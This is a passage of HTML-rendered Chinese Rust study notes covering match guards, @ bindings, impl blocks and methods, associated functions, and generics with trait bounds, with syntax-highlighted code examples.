keyword\">let</span> matched <span class=\"token operator\">=</span> <span class=\"token macro property\">matches!</span><span class=\"token punctuation\">(</span>foo<span class=\"token punctuation\">,</span> <span class=\"token char string\">'A'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'Z'</span> <span class=\"token operator\">|</span> <span class=\"token char string\">'a'</span><span class=\"token punctuation\">..</span><span class=\"token char string\">'z'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"解构\"><a href=\"#解构\" class=\"headerlink\" title=\"解构\"></a>解构</h3><p>解构其实也是模式匹配实现的，在上一节笔记中已经写过了，不做详细介绍</p>\n<h3 id=\"匹配守卫\"><a href=\"#匹配守卫\" class=\"headerlink\" title=\"匹配守卫\"></a>匹配守卫</h3><blockquote>\n<p>在要匹配的模式后面可以加上if condition，来对模式匹配进行进一步限制</p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">match</span> x <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Got 50\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> n <span class=\"token operator\">==</span> y <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Matched, n = {}\"</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        _ <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Default case, x = {:?}\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"at the end: x = {:?}, y = {}\"</span><span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p><strong>匹配守卫的条件会作用于所有的模式</strong></p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> x <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> y <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">match</span> x <span class=\"token punctuation\">{</span>\n    <span class=\"token number\">4</span> <span class=\"token operator\">|</span> <span class=\"token number\">5</span> <span class=\"token operator\">|</span> <span class=\"token number\">6</span> <span class=\"token keyword\">if</span> y <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    _ <span class=\"token operator\">=&gt;</span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>这个例子中看起来好像 <code>if y</code> 只作用于 <code>6</code>，但实际上匹配守卫 <code>if y</code> 作用于 <code>4</code>、<code>5</code> <strong>和</strong> <code>6</code> ，在满足 <code>x</code> 属于 <code>4 | 5 | 6</code> 后才会判断 <code>y</code> 是否为 <code>true</code>：</p>\n</blockquote>\n<h3 id=\"绑定\"><a href=\"#绑定\" class=\"headerlink\" title=\"@绑定\"></a>@绑定</h3><blockquote>\n<p>说白了就是我们即想要模式匹配，匹配成功后又想通过解构的形式拿到对应的值</p>\n<p>小孩子才做选择 大人全都要！</p>\n</blockquote>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Message</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span> id<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">let</span> msg <span class=\"token operator\">=</span> <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span> id<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">match</span> msg <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span> id<span class=\"token punctuation\">:</span> id_variable <span class=\"token operator\">@</span> <span class=\"token number\">3</span><span class=\"token punctuation\">..=</span><span class=\"token number\">7</span> <span class=\"token punctuation\">}</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found an id in range: {}\"</span><span class=\"token punctuation\">,</span> id_variable<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span> id<span class=\"token punctuation\">:</span> <span class=\"token number\">10</span><span class=\"token punctuation\">..=</span><span class=\"token number\">12</span> <span class=\"token punctuation\">}</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found an id in another range\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Hello</span> <span class=\"token punctuation\">{</span> id <span class=\"token punctuation\">}</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found some other id: {}\"</span><span class=\"token punctuation\">,</span> id<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上面这个例子的第一个分支中，我们既通过解构拿到了id，又对他进行了模式匹配: 在3..=7范围内才能通过。</p>\n<p>注意:</p>\n<blockquote>\n<p>考虑下面一段代码:</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">match</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">{</span>\n        num <span class=\"token operator\">@</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">2</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{}\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        _ <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>编译不通过，是因为 <code>num</code> 没有绑定到所有的模式上，只绑定了模式 <code>1</code>，你可能会试图通过这个方式来解决：</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\">num <span class=\"token operator\">@</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>但是，如果你用的是 Rust 1.53 之前的版本，那这种写法会报错，因为编译器不支持。</p>\n</blockquote>\n<h2 id=\"方法\"><a href=\"#方法\" class=\"headerlink\" title=\"方法\"></a>方法</h2><p>Rust使用<code>impl</code>块来定义方法，多说无益，先来一段示例代码</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// new是Circle的关联函数，因为它的第一个参数不是self</span>\n    <span class=\"token comment\">// 这种方法往往用于初始化当前结构体的实例</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// Circle的方法，&amp;self表示借用当前的Circle结构体</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>与java的不同在于，要实现一个类似于java类的结构，我们需要定义struct和它的impl，相当于字段的声明和方法的声明被分开了。</p>\n<p>并且，impl可以有很多个</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这样做的好处在于可以让方法的声明更加清晰，我们可以把为完成同一种职能的方法声明在一个impl块中，这样比起塞在一块会有条理得多。</p>\n<h3 id=\"关联函数-amp-方法\"><a href=\"#关联函数-amp-方法\" class=\"headerlink\" title=\"关联函数&amp;方法\"></a>关联函数&amp;方法</h3><p>看到<code>函数</code>和<code>方法</code>二字我们便可以知晓他们的不同。函数不会绑定在一个对象上，而方法会。</p>\n<p>我们先来看一下如何声明关联函数与方法</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// new是Circle的关联函数，因为它的第一个参数不是self</span>\n    <span class=\"token comment\">// 这种方法往往用于初始化当前结构体的实例</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">{</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// Circle的方法，&amp;self表示借用当前的Circle结构体</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看到，所谓的方法，就是传入了一个<code>&amp;self</code>的函数，这是一个语法糖，实际上是 <code>self: &amp;Self</code> 的简写。意思是我们传入了一个这个类型的实例的引用。这样在调用时便可以直接<code>circle.area()</code>。</p>\n<p>而没有传入自身引用的关联函数又是什么呢？我只说四个字——<strong>静态方法</strong>。</p>\n<h3 id=\"为枚举实现方法\"><a href=\"#为枚举实现方法\" class=\"headerlink\" title=\"为枚举实现方法\"></a>为枚举实现方法</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token attribute attr-name\">#![allow(unused)]</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Message</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Quit</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Move</span> <span class=\"token punctuation\">{</span> x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">ChangeColor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Message</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">call</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// 在这里定义方法体</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token keyword\">let</span> m <span class=\"token operator\">=</span> <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tm<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"泛型-amp-特征-trait\"><a href=\"#泛型-amp-特征-trait\" class=\"headerlink\" title=\"泛型&amp;特征(trait)\"></a>泛型&amp;特征(trait)</h2><h3 id=\"声明一个基础的泛型\"><a href=\"#声明一个基础的泛型\" class=\"headerlink\" title=\"声明一个基础的泛型\"></a>声明一个基础的泛型</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">T</span> <span class=\"token punctuation\">{</span>\n    a <span class=\"token operator\">+</span> b\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add i8: {}\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">2i8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3i8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add i32: {}\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add f64: {}\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1.23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>当然可以看出来，这串代码是跑不了的，不是所有类型都允许相加的</p>\n<h3 id=\"使用trait约束泛型的类型\"><a href=\"#使用trait约束泛型的类型\" class=\"headerlink\" title=\"使用trait约束泛型的类型\"></a>使用trait约束泛型的类型</h3><p>那我们就尝试对他的类型进行约束</p>\n<p>这里语法比较类似kotlin</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>ops<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">Output</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">T</span><span class=\"token operator\">&gt;&gt;</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token class-name\">T</span> <span class=\"token punctuation\">{</span>\n    a <span class=\"token operator\">+</span> b\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的<code>std::ops::Add&lt;Output = T&gt;</code>是不是比较类似于kotlin的接口？在rust中它叫做<code>trait </code>,特征。而实现了<code>std::ops::Add&lt;Output = T&gt;</code>,就支持了相加，泛型output就是相加后结果的类型。</p>\n<blockquote>\n<p>这些都说明一个道理，特征定义了<strong>一个可以被共享的行为，只要实现了特征，你就能使用该行为</strong>。</p>\n</blockquote>\n<h3 id=\"在枚举中使用泛型\"><a href=\"#在枚举中使用泛型\" class=\"headerlink\" title=\"在枚举中使用泛型\"></a>在枚举中使用泛型</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Option</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">None</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Result</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">E</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"在方法中使用泛型\"><a href=\"#在方法中使用泛型\" class=\"headerlink\" title=\"在方法中使用泛型\"></a>在方法中使用泛型</h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">impl</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">&gt;</span> <span class=\"token class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">x</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-&gt;</span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span> 